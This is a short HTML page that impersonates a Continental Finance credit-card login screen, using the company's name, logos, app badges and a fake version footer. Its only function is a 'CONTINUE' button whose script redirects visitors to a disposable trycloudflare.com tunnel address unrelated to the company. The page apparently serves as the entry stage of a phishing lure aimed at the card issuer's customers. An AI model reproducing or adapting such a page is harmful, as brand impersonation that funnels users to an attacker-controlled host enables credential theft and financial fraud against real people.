<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Continental Finance Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    body {
      background: linear-gradient(to right, #0058a8, #1b3374);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      padding-bottom: 80px;
    }
    .language-switch {
      position: absolute;
      top: 10px;
      left: 10px;
      background: #00aaff;
      color: white;
      padding: 6px 12px;
      border-radius: 4px;
      font-weight: bold;
    }
    h2.page-title {
      margin-top: 40px;
      text-align: center;
      color: white;
      font-size: 24px;
    }
    .container {
      background: white;
      margin-top: 20px;
      padding: 50px 40px;
      border-radius: 20px;
      width: 95%;
      max-width: 600px;
      text-align: center;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.25);
    }
    .card-banner {
      margin-bottom: 20px;
    }
    .card-banner img {
      width: 90%;
      max-width: 480px;
    }
    button.login-btn {
      background: #007bff;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 8px;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }
    .footer-note {
      font-size: 12px;
      color: #666;
    }
    .logo {
      margin: 10px auto;
    }
    .logo img {
      height: 40px;
    }
    .app-badges {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-top: 20px;
    }
    .app-badges img {
      height: 30px;
    }
    footer {
      background: #1b3374;
      color: white;
      padding: 10px 0;
      font-size: 14px;
      text-align: center;
      width: 100%;
      position: fixed;
      bottom: 0;
    }
    .accessibility {
      position: absolute;
      bottom: 10px;
      left: 10px;
      font-size: 22px;
      color: white;
    }
    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }
      .card-banner img {
        width: 100%;
      }
      .app-badges img {
        height: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="language-switch">English</div>

  <h2 class="page-title">Welcome!<br>Please continue.</h2>

  <div class="container">
    <div class="card-banner">
      <img src="card.png" alt="Card Options" />
    </div>

    <button class="login-btn" onclick="redirectToCFC()">‚Üí CONTINUE</button>

    <div class="app-badges">
      <img src="app.png" alt="App Store">
      <img src="google.png" alt="Google Play">
    </div>

    <div class="footer-note">Serviced by Continental Finance Company, LLC</div>
    <div class="logo">
      <img src="cfc.png" alt="Continental Finance Logo">
    </div>
  </div>

  <footer>
    CFC eCS P2.0.071625.1
  </footer>

  <div class="accessibility">üßë‚Äçü¶Ø</div>

  <script>
    function redirectToCFC() {
      window.location.href = 'https://consumption-chapel-leg-democrats.trycloudflare.com';
    }
  </script>
</body>
</html>
